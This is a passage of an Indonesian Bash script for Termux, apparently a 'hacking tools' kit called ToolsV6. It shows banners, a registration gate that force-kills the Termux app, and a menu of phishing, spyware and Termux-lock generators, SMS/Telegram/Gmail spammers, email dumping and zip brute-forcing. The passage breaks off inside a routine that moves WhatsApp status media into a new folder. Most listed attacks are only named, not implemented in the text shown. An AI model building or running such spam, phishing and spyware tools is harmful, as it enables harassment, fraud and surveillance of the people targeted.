⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⠶⠿⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡄⢀⠴⠀⠀⠀⠀⠀⠀⠀⠈⠙⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣎⣴⣋⣠⣤⣔⣠⣤⣤⣠⣀⣀⠀⠀⠈⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣂⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⡀⠀⠀
⠀⠀⠀⠀⠀⠀⢠⡾⣻⣿⣿⣿⣿⠿⠿⠿⠿⢿⣿⣿⣿⣿⣿⣿⣿⣷⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⣿⣧⡀⠀
⠀⠀⠀⠀⠀⣀⣾⣿⣿⣿⠿⠛⠂⠀⠀⡀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡈⢻⣿⣿⣆⠈⢻⣧⠀
⠀⠀⠀⠀⠻⣿⠛⠉⠀⠀⠀⠀⢀⣤⣾⣿⣦⣤⣤⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣄⠙⢿⣿⣿⣿⡇⠀⢻⣿⣿⡀⠀⠻⡆
⠀⠀⣰⣤⣤⣤⣤⣤⣤⣴⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠈⢻⣿⣿⣿⠀⠀⢹⣿⣇⠀⠀⠳
⠀⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⢻⠛⠛⠻⣿⣿⣿⣿⣿⣿⣿⣧⠀⢻⣿⣿⡆⠀⠀⢻⣿⠀⠀⠀
⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠁⠀⠼⠛⢿⣶⣦⣿⣿⠻⣿⣿⣿⣿⣿⣇⠀⢻⣿⡇⠀⠀⠀⣿⠀⠀⠀
⠸⠛⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⠀⠀⠀⠀⠀⠘⠁⠈⠛⠋⠀⠘⢿⣿⣿⣿⣿⡀⠈⣿⡇⠀⠀⠀⢸⡇⠀⠀
⠀⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⣿⣿⡇⠀⢹⠇⠀⠀⠀⠈⠀⠀⠀
⠀⠀⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⡇⠀⠼⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⡉⠛⠛⠿⠿⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢈⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠘⢿⣿⣿⣿⣷⡀⠉⠙⠻⠿⢿⣿⣷⣤⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠙⠿⣿⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀⢀⡄⠀⠀⠀⢀⣠⣾⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠿⢦⣀⠀⠀⠀⢀⣴⣿⣧⣤⣴⣾⡿⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠛⠛⠛⠛⠛⠉⠁⠀⠀⠀⠀
" | boxes -d "$cok" | lolcat
echo ""
echo -e "\033[32;1m╔═════════════════════════════════════╗"
echo -e "\033[32;1m║ ${r}         TOOLSV6__SCANNING         ${g} ║"
echo -e "\033[32;1m╚═════════════════════════════════════╝"
echo ""
}
banner5() {
mpv --no-video --quiet "$HOME/Son/C2.mp3" &> /dev/null &
sleep 2
echo -e "${bold_bg}${bold_gren} PESAN ${n}"
echo -e "${g} Percayalah kepada diri sendiri jangan percaya terhadap orang lain."
echo "
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣴⣾⣿⣿⣿⣿⣿⣿⣶⣄⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⠿⢿⣿⣿⣿⣿⣆⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⣿⣿⠁⠀⠿⢿⣿⡿⣿⣿⡆⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣦⣤⣴⣿⠃⠀⠿⣿⡇⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⡿⠋⠁⣿⠟⣿⣿⢿⣧⣤⣴⣿⡇⠀
⠀⠀⠀⠀⢀⣠⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀⠀⠀⠘⠁⢸⠟⢻⣿⡿⠀⠀
⠀⠀⠙⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣴⣇⢀⣤⠀⠀⠀⠀⠘⣿⠃⠀⠀
⠀⠀⠀⠀⠀⢈⣽⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣴⣿⢀⣴⣾⠇⠀⠀⠀
⠀⠀⣀⣤⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀
⠀⠀⠉⠉⠉⠉⣡⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠃⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⡿⠟⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁⠀⠀⠀⠀⠀⠀
⠀⠀⣴⡾⠿⠿⠿⠛⠋⠉⠀⢸⣿⣿⣿⣿⠿⠋⢸⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⡿⠟⠋⠁⠀⠀⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠀⠀⠀⠀⠀⠀⠈⠀
" | boxes -d "$cok" | lolcat 
echo ""
echo -e "\033[32;1m╔═════════════════════════════════════╗"
echo -e "\033[32;1m║ ${r}         TOOLSV6__SCANNING         ${g} ║"
echo -e "\033[32;1m╚═════════════════════════════════════╝"
echo ""
}
minggir_lu() {
local pilih=$(( (RANDOM % 5) + 1 ))
banner${pilih}
}
dasar_kroco() {
SOUND="$HOME/Son/Sound.mp3"
if [ -f "$SOUND" ]; then
mpv --no-terminal --quiet --volume=150 "$SOUND" &
for i in {1..10}; do
echo -ne "\r${y} Loading..!!" "${c}[ ${r}${i}0% ${c}] "
sleep 0.02
echo -ne "\r${y} Loading..!!" "${c}[ ${r}${i}0% ${c}]"
sleep 0.4
done
echo -ne "\r${y} Loading..!!" "${c}[ ${r}100% ${c}]"
sleep 1
mpv --no-video --quiet "$HOME/Son/Y.mp3" &> /dev/null &
echo -e "${g} Loading Selesai..!!"
sleep 2
else
echo -e "${r}File Sound.mp3 Tidak Ditemukan..!!"
fi
}
cek_paket
minggir_lu
dasar_kroco
if [ -f "$HOME/usr.txt" ]; then
nama_user=$(cat "$HOME/usr.txt" | tr -d '\n' | sed 's/^[[:space:]]*//;s/[[:space:]]*$//')
if [ -n "$nama_user" ]; then
sound_file=$(generate_suara "$nama_user")
mpv --no-terminal --quiet --volume=100 "$sound_file" &> /dev/null &
sound_pid=$!
clear 
echo ""
txt "Hallo ${nama_user}, selamat datang di Tools V6" 0.07 "${c}"
wait $sound_pid 2>/dev/null
echo ""
sleep 1
clear
else
clear 
echo ""
echo -e "${r}Nama blum terdaftar silahkan daftar !! "
echo ""
pkill -9 -f com.termux
fi
else
clear 
echo ""
echo -e "${r}❌ Nama kamu belum terdaftar!${n}"
echo -e "${y}📝 Silahkan buat file : "Namamu" > $HOME/usr.txt${n}"
echo ""
pkill -9 -f com.termux
fi
mek="ansi-rounded"
hei_babi() {
local repo="https://github.com/Apwusyvwkjwygw/.whoami"
local dir="$HOME/.cek_daftar"
rm -rf "$dir" 2>/dev/null
git clone --depth 1 "$repo" "$dir" 2>/dev/null
if [ -f "$dir/Daftar.txt" ]; then
grep -c '' "$dir/Daftar.txt"
rm -rf "$dir"
else
rm -rf "$dir"
echo "0"
fi
}
JML=$(hei_babi 2>/dev/null | head -1)
JML=${JML:-0}
main_menu() {
while true; do
clear
mpv --no-video --quiet "$HOME/Yalakan/Y.mp3" &> /dev/null &
sleep 1
mpv --no-video --quiet "$HOME/Yalakan/klik.mp3" &> /dev/null &
echo -e "${r}
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⡀⠀⠀⠀⠀⢀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣤⣴⣦⣈⠙⠻⠿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠟⠋⣁⣤⣦⣤⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⣿⣿⣿⣿⣿⣶⣤⣤⣈⣈⣉⣉⣉⣀⣤⣴⣶⣿⣿⣿⣿⣿⣿⡿⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣄⠀⠙⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠋⠁⣠⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⣷⠀⠀⠀⠈⠉⠛⠻⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠟⠛⠉⠀⠀⠀⠀⣺⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣆⠀⠀⠀⠀⠈⣿⣶⣶⣾⣿⣿⣿⣿⣶⣶⣶⣿⠅⠀⠀⠀⠀⣰⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣿⣧⡀⠀⠀⠀⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠃⠀⠀⠀⢀⣼⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⢻⣿⣿⣦⡀⠀⠀⠀⠉⠛⠿⣿⣿⠿⠛⠉⠀⠀⠀⢀⣴⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠒⠾⠿⣿⣿⣿⣿⣿⣿⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⣿⣿⣿⣿⣿⣿⠿⠗⠒⠂⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠙⠻⢿⣿⣿⣿⣷⣦⣀⠀⠀⠀⠀⣀⣴⣾⣿⣿⣿⡿⠟⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⢿⣿⣿⣿⣆⠀⠀⣰⣿⣿⣿⡿⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⠀⠀⣿⣿⠟⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠹⠇⢸⠛⠀⠀⠀"
echo ""
echo -e "${g}============================================="
echo -e "${p}        <<<< NOTIFIKASI SYSTEM >>>> " 
echo -e "${g}============================================="
echo -e "$w➜ Developer : ${bold_bg}${bold_gren} Thxyzz404 ${n} "
echo -e "$w➜ Skrg hari : $ucapan "
echo -e "$w➜ Skrg tanggal : $tanggal "
echo -e "$w➜ Skrg bulan : $bulan "
echo -e "$w➜ Selamat : $sambutan "
echo -e "$w➜ Rilis : 17 / 12 / 2024 "
echo -e "$w➜ Setatus : $(cek_akses) "
echo -e "$w➜ Jumlah pengguna prem ${c}:${y} $((JML + 0)) "
echo -e "$w➜ CONTACTS ME : t.me/yayayaya0618"
echo -e "$w➜ QR donasi admin 👇👇 "
echo -e "${r}Link ${y}:${c} https://j.top4top.io/p_3812kyzmd1.jpg "
echo ""
echo -e  "\033[1;30m╔══════════════════════════════════════╗"
echo -e  "\033[1;30m║      ${bold_bg}${bold_gren} LEMARI TOOLS ADA DIBAWAH ${n}\033[1;30m      ║${n}"
echo -e  "\033[1;30m╠══════════════════════════════════════╣"
echo -e  "\033[1;30m║${r} [${g} AL ${r}]${c} MENU HACKING MEDIA            \033[1;30m║"
echo -e  "\033[1;30m║${r} [${g} PS ${r}]${c} MENU PSHING MEDIA             \033[1;30m║"
echo -e  "\033[1;30m║${r} [${g} DO ${r}]${c} MENU DOWNLOAD MEDIA           \033[1;30m║"
echo -e  "\033[1;30m║${r} [${g} TM ${r}]${c} MENU SC+ TAMBAHAN             \033[1;30m║"
echo -e "$w╠══════════════════════════════════════╣"
echo -e "$w║        ${bold_bg}${bold_gren}  PENGATURAN TOOLSV6  ${n}      $w  ║${n}"
echo -e "$w╠══════════════════════════════════════╣"
echo -e "$w║${a}[ ${g}BUG ${a}]◉ ${g}[ ${c}Laporkan__BUGS${g} ]        $w   ║"
echo -e "$w║${a}[${y} MGR ${r}]${c}◉ ${y}[ MANAGER SETTING SOUND ]   $w ║"
echo -e "$w║${a}[ ${g}PMR ${a}]◉ ${g}[ Pemberitahuan ]       $w     ║"
echo -e "$w║${a}[ ${g}KLR ${a}]◉ ${g}[ Keluar ]                 $w  ║"
echo -e "$w║${a}[ ${g}PBR ${a}]◉ ${g}[ ${c}Pembersihan${g} ]           $w   ║"
echo -e "$w╚══════════════════════════════════════╝"
echo ""
read -p "$(echo -e "${b}❯❯❯ ${y}Masukkan pilihan anda ${r}[ ${g}TOOLSV6 ${r}]${c} : ")" thxyzz404
echo ""
case "$thxyzz404" in
AL|al) all_menu ;;
PS|ps) psg_menu ;;
DO|do) down_menu ;;
TM|tm) tm_menu ;;
BUG|bug) bug ;;
MGR|mgr) musik ;;
PMR|pmr) pemberitahuan ;;
KLR|klr) keluar ;;
PBR|pbr) delete ;;
*)
mpv --no-video --quiet "$HOME/Yalakan/salah.mp3" &> /dev/null &
sleep 1
mpv --no-video --quiet "$HOME/Yalakan/Tidak_Ada.mp3" &> /dev/null &
echo -e "${bold_bg}${green} Menu Tidak Ada Di ToolsV6 ${n}"
sleep 6
clear
;;
esac
done
}
ctrl_c() {
clear
mpv --no-video --quiet "$HOME/Yalakan/salah.mp3" &> /dev/null &
echo ""
echo -e "${bold_bg}${bold_gren}Jangan Kaluar Mendadak, Mengulang !! \033[0m"
sleep 2
echo ""
clear
main_menu
return 0
}
trap ctrl_c INT
all_menu() {
while true; do
clear
mpv --no-video --quiet "$HOME/Yalakan/Y.mp3" &> /dev/null &
sleep 1
mpv --no-video --quiet "$HOME/Yalakan/klik.mp3" &> /dev/null &
echo "
            ⣠⡀⠀⠀⢀⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣤⣤⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⢿⣿⣿⣿⣿⣿⣿⡿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⣀⣠⠀⣶⣤⣄⣉⣉⣉⣉⣠⣤⣶⠀⣄⣀⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⣶⣾⣿⣿⣿⣿⣦⣄⣉⣙⣛⣛⣛⣛⣋⣉⣠⣴⣿⣿⣿⣿⣷⣶⠀⠀⠀
⠀⠀⠀⠀⠈⠉⠉⠛⠛⠛⠻⠿⠿⠿⠿⠿⠿⠿⠿⠟⠛⠛⠛⠉⠉⠁⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣷⣆⠀⠀⠀⢠⡄⠀⠀⠀⣰⣾⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢀⣠⣶⣾⣿⡆⠸⣿⣶⣶⣾⣿⣿⣷⣶⣶⣿⠇⢰⣿⣷⣶⣄⡀⠀⠀⠀
⠀⠀⠺⠿⣿⣿⣿⣿⣿⣄⠙⢿⣿⣿⣿⣿⣿⣿⡿⠋⣠⣿⣿⣿⣿⣿⠿⠗⠀⠀
⠀⠀⠀⠀⠀⠙⠻⣿⣿⣿⣷⡄⠈⠙⠛⠛⠋⠁⢠⣾⣿⣿⣿⠟⠋⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣀⣤⣬⣿⣿⣿⣇⠐⣿⣿⣿⣿⠂⣸⣿⣿⣿⣥⣤⣀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠘⠻⠿⠿⢿⣿⣿⣿⣧⠈⠿⠿⠁⣼⣿⣿⣿⡿⠿⠿⠟⠃⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⢿⠀⣶⣦⠀⡿⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⠛⠀⠀
 Developer : Thxyzz404 ©2026
" | boxes -d "$mek" | lolcat
echo ""
echo -e "$w╔═════════════════════════════════════════════╗"
echo -e "$w║         ${bold_bg}${bold_gren}  𖤍 MENU HACKING MEDIA 𖤍  ${n}       $w   ║${n}"
echo -e "$w╠═════════════════════════════════════════════╣"
echo -e "$w║${r} [ ${g}1 ${r}] ${c}Hack Status WhatsApp                  $w║"
echo -e "$w║${r} [ ${g}2 ${r}] ${c}Template Gmail Akun                   $w║"
echo -e "$w║${r} [ ${g}3 ${r}] ${c}Scan URL Virustotal                   $w║"
echo -e "$w║${r} [ ${g}4 ${r}] ${c}Generator Termux Lock & Spyware       $w║"
echo -e "$w║${r} [ ${g}5 ${r}] ${c}Dork Github Akun                      $w║"
echo -e "$w║${r} [ ${g}6 ${r}] ${c}Tema Termux Pro                       $w║"
echo -e "$w║${r} [ ${g}7 ${r}] ${c}Dork Npsn Sekolah                     $w║"
echo -e "$w║${r} [ ${g}8 ${r}] ${c}Screenshot URL Website                $w║"
echo -e "$w║${r} [ ${g}9 ${r}] ${c}Spammer Telegram Login                $w║"
echo -e "$w║${r} [ ${g}10 ${r}] ${c}Dork PTK Sekolah                     $w║"
echo -e "$w║${r} [ ${g}11 ${r}] ${c}Sporty Pay Stel Lagu                 $w║"
echo -e "$w║${r} [ ${g}12 ${r}] ${c}Dump Email Crew Website              $w║"
echo -e "$w║${r} [ ${g}13 ${r}] ${c}Create Gallery Eyes                  $w║"
echo -e "$w║${r} [ ${g}14 ${r}] ${c}Prank Kaget URL                      $w║"
echo -e "$w║${r} [ ${g}15 ${r}] ${c}Parser Nik                           $w║"
echo -e "$w║${r} [ ${g}16 ${r}] ${c}Openai AI Asisten                    $w║"
echo -e "$w║${r} [ ${g}17 ${r}] ${c}Generator QR                         $w║"
echo -e "$w║${r} [ ${g}18 ${r}] ${c}Bruteforce File Zip                  $w║"
echo -e "$w║${r} [ ${g}19 ${r}] ${c}Scanner Foto Album                   $w║"
echo -e "$w║${r} [ ${g}20 ${r}] ${c}Botz Get ID Telegram                 $w║"
echo -e "$w║${r} [ ${g}21 ${r}] ${c}Spammer NGL                          $w║"
echo -e "$w║${r} [ ${g}22 ${r}] ${c}Upload Foto Ke URL                   $w║"
echo -e "$w║${r} [ ${g}23 ${r}] ${c}Python OBF Coder                     $w║"
echo -e "$w║${r} [ ${g}24 ${r}] ${c}Upload Video Ke URL                  $w║"
echo -e "$w║${r} [ ${g}25 ${r}] ${c}Convert URL Ke BITLY                 $w║"
echo -e "$w║${r} [ ${g}26 ${r}] ${c}Spam Telegram Via Token              $w║"
echo -e "$w║${r} [ ${g}27 ${r}] ${c}Genz Resource File                   $w║"
echo -e "$w║${r} [ ${g}28 ${r}] ${c}Html OBF Coder                       $w║"
echo -e "$w║${r} [ ${g}29 ${r}] ${c}Kostum Prot Penyamaran URL           $w║"
echo -e "$w║${r} [ ${g}30 ${r}] ${c}Report WhatsApp Number               $w║"
echo -e "$w║${r} [ ${g}31 ${r}] ${c}Checker IMEI Info                    $w║"
echo -e "$w║${r} [ ${g}32 ${r}] ${c}Bash Shel OBF Coder                  $w║"
echo -e "$w║${r} [ ${g}33 ${r}] ${c}Check Jaringan Network               $w║"
echo -e "$w║${r} [ ${g}34 ${r}] ${c}Check Sender Akun Email              $w║"
echo -e "$w║${r} [ ${g}35 ${r}] ${c}Scanner QR Code                      $w║"
echo -e "$w║${r} [ ${g}36 ${r}] ${c}Control Botz Telegram                $w║"
echo -e "$w║${r} [ ${g}37 ${r}] ${c}Vercel Deploy Website                $w║"
echo -e "$w║${r} [ ${g}38 ${r}] ${c}Search Media Sosial                  $w║"
echo -e "$w║${r} [ ${g}39 ${r}] ${c}Spammer Gmail                        $w║"
echo -e "$w║${r} [ ${g}40 ${r}] ${c}Dork Botz Telegram                   $w║"
echo -e "$w║${r} [ ${g}41 ${r}] ${c}Dork Postal Kode                     $w║"
echo -e "$w║${r} [ ${g}42 ${r}] ${c}Track IP Address                     $w║"
echo -e "$w║${r} [ ${g}43 ${r}] ${c}Generator Wordslit Password          $w║"
echo -e "$w║${r} [ ${g}44 ${r}] ${c}Spammer OTP sms & wea                $w║"
echo -e "$w║${r} [ ${g}45 ${r}] ${c}Upload file to URL                   $w║"
echo -e "$w║${p} [ ${r}bk ${p}] ${g}KEMBALI KE MENU AWAL                 $w║"
echo -e "$w╚═════════════════════════════════════════════╝"
echo ""
read -p "$(echo -e "${b}❯❯❯ ${y}Masukkan pilihan anda ${r}[ ${g}TOOLSV6 ${r}]${c} : ")" all
echo ""
if [[ "$all" == "1" ]]; then
mpv --no-video --quiet "$HOME/Yalakan/oke.mp3" &> /dev/null &
echo -e "${r} Anda Memilih Menu Hacking !!"
echo ""
echo -e "${g} PROGRES ✅"
sleep 2
r='\033[31;1m'
c='\033[36;1m'
y='\033[33;1m'
g='\033[32;1m'
p='\033[35;1m'
hex_whatsapp_business() {
    paths=(
        "/sdcard/WhatsApp Business/Media/.Statuses"
        "/storage/emulated/0/WhatsApp Business/Media/.Statuses"
        "/sdcard/Android/media/com.whatsapp.w4b/WhatsApp Business/Media/.Statuses"
        "/sdcard/Android/data/com.whatsapp.w4b/WhatsApp Business/Media/.Statuses"
    )
    target="/sdcard/Status_hex_business"
    source=""
    for path in "${paths[@]}"; do
        if [ -d "$path" ]; then
            source="$path"
            break
        fi
    done
    if [ -z "$source" ]; then
        clear 
        echo ""
        echo -e "${r}[ ${g}x ${r}]${y} WhatsApp business tidak di temukan."
        echo ""
    fi
    mkdir -p "$target"
    files=()
    while IFS= read -r -d '' file; do
        files+=("$(basename "$file")")
    done < <(find "$source" -type f \( -iname "*.jpg" -o -iname "*.jpeg" -o -iname "*.png" -o -iname "*.mp4" -o -iname "*.gif" \) -print0)
    if [ ${#files[@]} -eq 0 ]; then
        clear 
        echo ""
        echo -e "${r}[ ${g}x ${r}]${y} Setatus tidak ada."
        echo ""
    fi
    moved_count=0
    for file in "${files[@]}"; do
        from="$source/$file"
        to="$target/$file"
        if mv "$from" "$to" 2>/dev/null; then
            ((moved_count++))
        fi
    done
    echo -e "${r}[ ${g}✓ ${r}]${c} Semua setatus telah di ambil,"
    echo -e "${c} dan di pindahkan ke folder Status_hex_business [ $moved_count ]"
    echo ""
    sleep 4
    clear 
}
hex_whatsapp_original() {
    paths=(
        "/sdcard/WhatsApp/Media/.Statuses"
        "/storage/emulated/0/WhatsApp/Media/.Statuses"
        "/sdcard/Android/media/com.whatsapp/WhatsApp/Media/.Statuses"
        "/sdcard/Android/data/com.whatsapp/WhatsApp/Media/.Statuses"
    )
    target="/sdcard/Status_hex_wea_Ori"
    source=""
    for path in "${paths[@]}"; do
        if [ -d "$path" ]; then
            source="$path"
            break
        fi
    done
    if [ -z "$source" ]; then
        clear 
        echo ""
        echo -e "${r}[ ${g}x ${r}]${y} WhatsApp ori tidak di temukan."
        echo ""
    fi
    mkdir -p "$target"
    files=()
    while IFS= read -r -d '' file; do
        files+=("$(basename "$file")")
    done < <(find "$source" -type f \( -iname "*.jpg" -o -iname "*.jpeg" -o -iname "*.png" -o -iname "*.mp4" -o -iname "*.gif" \) -print0)
    if [ ${#files[@]} -eq 0 ]; then
        clear 
        echo ""
        echo -e "${r}[ ${g}x ${r}]${y} Setatus tidak ada."
        echo ""
    fi
    moved_count=0
    for file in "${files[@]}"; do
        from="$source/$file"
        to="$target/$file"
        if mv "$from" "$to" 2>/dev/null; then
